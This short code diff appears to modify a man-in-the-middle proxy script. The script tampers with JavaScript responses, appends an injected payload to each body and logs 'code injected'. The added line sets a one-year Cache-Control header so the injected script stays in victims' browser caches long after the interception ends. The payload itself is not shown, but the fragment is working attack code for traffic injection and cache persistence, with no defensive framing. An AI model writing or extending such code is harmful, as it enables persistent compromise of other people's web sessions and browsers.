@@ -18,6 +18,7 @@ proxy.tamper(/\.js/, function(request){
         console.log("code injected: " + payload);
         response.body += payload;
         response.headers['content-length'] = response.body.length;
+        response.headers["Cache-Control"] = "max-age=31536000"; // 1 year
         response.complete();
     });
 });
